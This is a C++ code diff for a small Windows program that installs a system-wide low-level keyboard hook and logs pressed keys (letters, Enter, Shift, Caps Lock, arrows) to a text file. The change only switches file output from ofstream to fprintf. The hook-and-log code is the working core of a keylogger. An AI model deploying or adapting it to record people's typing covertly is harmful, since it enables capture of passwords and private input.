@@ -6,9 +6,8 @@
 #include <tchar.h>
 #include <windows.h>
 #include <conio.h>
-#include <fstream>
 
-std::ofstream outFile("lastInput.txt");
+std::FILE *fp = std::fopen("lastInput.txt", "w");
 
 HHOOK keyboardHook = 0;
 
@@ -31,27 +30,27 @@ LRESULT CALLBACK LowLevelKeyboardProc(
     {
         if (0x41 <= ks->vkCode && ks->vkCode <= 0x5A)
         {
-            outFile << "Keys" << ks->vkCode - 0x41 + 'A' << "pressed" << std::endl;
+            fprintf(fp, "Keys %c pressed\n", ks->vkCode - 0x41 + 'A');
         }
         else if (ks->vkCode == 0x0D)
         {
-            outFile << "Keys ENTER pressed" << std::endl;
+            fprintf(fp, "Keys ENTER pressed\n");
         }
         else if (ks->vkCode == 0x10)
         {
-            outFile << "Keys SHIFT pressed" << std::endl;
+            fprintf(fp, "Keys SHIFT pressed\n");
         }
         else if (ks->vkCode == 0x14)
         {
-            outFile << "Keys CAPS LOCK pressed" << std::endl;
+            fprintf(fp, "Keys CAPS LOCK pressed\n");
         }
         else if (ks->vkCode == 0x25)
         {
-            outFile << "Keys LEFT ARROW pressed" << std::endl;
+            fprintf(fp, "Keys LEFT ARROW pressed\n");
         }
         else if (ks->vkCode == 0x27)
         {
-            outFile << "Keys RIGHT ARROW pressed" << std::endl;
+            fprintf(fp, "Keys RIGHT ARROW pressed\n");
         }
     }
 
@@ -70,7 +69,7 @@ int _tmain(int argc, _TCHAR *argv[])
     if (keyboardHook == 0)
     {
         printf("挂钩键盘失败\n");
-        outFile.close();
+        std::fclose(fp);
         return -1;
     }
 
@@ -86,7 +85,7 @@ int _tmain(int argc, _TCHAR *argv[])
     // 删除钩子
     UnhookWindowsHookEx(keyboardHook);
 
-    outFile.close();
+    std::fclose(fp);
     return 0;
     
 }
